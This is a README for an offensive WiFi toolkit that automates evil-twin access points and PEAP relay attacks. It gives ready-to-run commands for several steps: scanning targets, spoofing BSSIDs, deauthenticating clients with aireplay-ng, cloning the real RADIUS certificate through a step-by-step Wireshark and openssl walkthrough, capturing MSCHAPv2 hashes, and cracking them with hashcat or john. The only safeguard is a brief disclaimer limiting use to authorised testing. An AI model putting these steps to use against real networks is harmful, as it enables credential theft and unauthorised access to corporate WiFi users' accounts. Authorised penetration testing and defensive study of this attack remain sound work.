# wifiee

**WiFi EAP Evil-twin & PEAP Relay Toolkit**

Automated rogue AP setup for PEAP relay attacks using [hostapd-mana](https://github.com/sensepost/hostapd-mana) and [wpa_sycophant](https://github.com/sensepost/wpa_sycophant). Handles target scanning, BSSID spoofing, client deauthentication, RADIUS certificate cloning, and relay orchestration — all from a single script.

```
  ╦ ╦╦╔═╗╦╔═╗╔═╗
  ║║║║╠╣ ║║╣ ║╣
  ╚╩╝╩╚  ╩╚═╝╚═╝
  WiFi EAP Evil-twin & PEAP Relay
```

## What it does

1. **Scans** for the target SSID and lists all broadcasting APs (BSSID, channel, signal)
2. **Lets you choose** how to spoof — clone the real BSSID, use a random one, or set a custom MAC
3. **Probes** the real AP to extract the RADIUS server certificate subject for realistic cloning
4. **Deauths** clients from the real AP (aircrack-ng / mdk4 / scapy — uses whatever is installed)
5. **Launches** the rogue AP (hostapd-mana) and the EAP relay (wpa_sycophant) simultaneously
6. **Captures** PEAP/MSCHAPv2 challenge-response hashes in the terminal (MANA WPE output)

## Requirements

- **OS:** Kali Linux 2024+ (tested on 2025/2026, kernel 6.x, OpenSSL 3.x)
- **Adapters:** Two wireless interfaces with AP mode support
- **Packages:** Installed automatically if missing

| Package | Purpose |
|---------|---------|
| `hostapd-mana` | Rogue AP with MANA/WPE/sycophant support |
| `aircrack-ng` | Deauthentication (aireplay-ng + airmon-ng) |
| `build-essential libssl-dev libnl-3-dev libnl-genl-3-dev` | Building wpa_sycophant |

Optional: `xterm` (sycophant runs in a separate window), `mdk4`, `python3-scapy`

### Tested adapters

| Adapter | Chipset | Notes |
|---------|---------|-------|
| Alfa AWUS036AXML | MediaTek MT7921AU | Driver in mainline kernel (mt7921u). VMware USB passthrough may cause `probe_req: send failed` — use random BSSID or run bare metal. |
| Alfa AWUS036ACH | Realtek RTL8812AU | Needs out-of-tree driver. Good for deauth-only role. |
| Alfa AWUS036ACM | MediaTek MT7612U | Works well in AP mode on Linux. |

## Install

```bash
git clone https://github.com/YOUR_USERNAME/wifiee.git
cd wifiee
chmod +x wifiee.sh
```

## Usage

### Interactive (recommended)

```bash
sudo ./wifiee.sh
```

You'll be prompted for the target SSID, then guided through BSSID selection, channel options, and deauth.

### With flags

```bash
# Specify everything up front
sudo ./wifiee.sh --ssid "CorpWiFi" --channel 6 --country AU

# Use specific interfaces
sudo ./wifiee.sh --ssid "CorpWiFi" --iface-ap wlan1 --iface-relay wlan0

# Skip deauth
sudo ./wifiee.sh --ssid "CorpWiFi" --no-deauth

# Custom certificate details for realism
sudo ./wifiee.sh --ssid "CorpWiFi" --cert-cn "radius.corp.com" --cert-org "Acme Corp"
```

### All options

```
Target:
  --ssid NAME           Target SSID (prompted if omitted)
  --bssid MAC           Target BSSID (auto-scanned if omitted)
  --channel N           Channel (auto-detected if omitted)

Interfaces:
  --iface-ap IFACE      Rogue AP interface (default: wlan0)
  --iface-relay IFACE   Relay interface (default: wlan1)
  --country CC          Regulatory domain (default: US)

Certificate:
  --cert-cn CN          Common Name (FQDN of RADIUS server)
  --cert-org ORG        Organisation name
  --cert-ou OU          Organisational Unit
  --cert-state ST       State/Province
  --cert-city CITY      City/Locality
  --cert-file PATH      Use an existing certificate (.crt/.pem)
  --cert-key PATH       Use an existing private key (.key)
  --cert-capture        Capture-only mode — grab EAP handshake, then exit

Deauth:
  --deauth N            Deauth burst count (default: 10)
  --no-deauth           Skip deauth phase

  -h, --help            Show help
```

## Certificate cloning

A convincing rogue AP needs a certificate that looks like the real RADIUS server's. There are three ways to get it right.

### Method 1: Auto-probe (default)

The script automatically tries to connect to the real AP and extract the certificate subject. If it works, you'll see the extracted subject and can use it directly.

### Method 2: Capture & extract with Wireshark

If auto-probe fails (common when you're not in range yet, or the AP ignores your probe), capture the EAP handshake manually:

**Step 1 — Capture the handshake:**

```bash
# Option A: Use wifiee's built-in capture mode
sudo ./wifiee.sh --ssid "CorpWiFi" --cert-capture

# Option B: Manual capture with airmon-ng
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --bssid <BSSID> -c <CHANNEL> -w handshake
# Wait for a client to authenticate, or deauth one:
sudo aireplay-ng -0 5 -a <BSSID> wlan0mon
# Stop when you see EAP frames
sudo airmon-ng stop wlan0mon
```

**Step 2 — Extract the certificate in Wireshark:**

```bash
wireshark handshake.pcap    # or handshake-01.cap from airodump
```

Apply this display filter:

```
wlan.bssid==<BSSID> && eap && tls.handshake.certificate
```

In the packet details pane:
1. Expand **Extensible Authentication Protocol**
2. Expand **Transport Layer Security** → **Handshake Protocol: Certificate**
3. Expand **Certificates** → select the first certificate (the server cert)
4. Right-click → **Export Bytes** → save as `server.der`

**Step 3 — Read the certificate details:**

```bash
openssl x509 -inform DER -in server.der -noout -subject -issuer

# Example output:
# subject=C=AU, ST=Queensland, L=Brisbane, O=Acme Corp, OU=IT, CN=radius.acme.com
# issuer=C=AU, ST=Queensland, O=Acme Corp, CN=Acme Corp CA
```

**Step 4 — Create a matching rogue certificate:**

```bash
# Option A: Pass the fields as flags
sudo ./wifiee.sh --ssid "CorpWiFi" \
  --cert-cn "radius.acme.com" \
  --cert-org "Acme Corp" \
  --cert-ou "IT" \
  --cert-state "Queensland" \
  --cert-city "Brisbane" \
  --country AU

# Option B: Convert and import the real cert (if you have the key)
openssl x509 -inform DER -in server.der -out server.crt
sudo ./wifiee.sh --ssid "CorpWiFi" --cert-file server.crt --cert-key server.key

# Option C: Interactive — the script will prompt you for each field
sudo ./wifiee.sh --ssid "CorpWiFi"
# Select "Build custom certificate" when prompted
```

### Method 3: Interactive builder

If you run the script without cert flags and auto-probe fails, you'll be prompted to build a custom certificate interactively — entering Country, State, City, Organisation, OU, CN, key size, and validity. This is the easiest path when you already know what the real cert looks like.

## Attack flow

```
┌──────────────┐     deauth      ┌──────────────┐
│   Real AP    │◄────────────────│   wlan1       │
│  (CorpWiFi)  │                 │  (relay)      │
└──────┬───────┘                 └──────┬────────┘
       │                                │
       │  clients forced off            │  sycophant relays
       │                                │  EAP exchange
       ▼                                ▼
┌──────────────┐   EAP relay    ┌───────────────┐
│   Client     │───────────────►│   wlan0        │
│  reconnects  │                │  (rogue AP)    │
│  to rogue    │                │  hostapd-mana  │
└──────────────┘                └───────┬────────┘
                                        │
                                        ▼
                                 ┌──────────────┐
                                 │  Captured     │
                                 │  MSCHAPv2     │
                                 │  hashes       │
                                 └──────────────┘
```

## VMware notes

If running Kali as a VMware guest with USB-passthrough adapters:

- Set **VM > Settings > USB Controller** to **USB 3.1**
- Connect the adapter via **VM > Removable Devices > MediaTek Wireless_Device > Connect**
- If you see `handle_probe_req: send failed`, select **Random BSSID** (option 2) or try the **2.4GHz channel override**
- For best results, run Kali on **bare metal** or a **Raspberry Pi**

## Cracking captured hashes

MANA WPE outputs MSCHAPv2 challenge-response pairs. Crack with hashcat:

```bash
# Extract the hash line from hostapd-mana output (format: NETNTLM)
hashcat -m 5500 captured_hash.txt wordlist.txt
```

Or with john:

```bash
john --format=netntlmv1 captured_hash.txt --wordlist=wordlist.txt
```

## Disclaimer

This tool is intended for **authorised security assessments only**. Only use against networks you have explicit written permission to test. Unauthorised use is illegal in most jurisdictions.

## Credits

- [SensePost](https://github.com/sensepost) — hostapd-mana, wpa_sycophant
- [1mm0rt41PC](https://github.com/1mm0rt41PC) — original PEAP relay script concept

## License

GPL-2.0
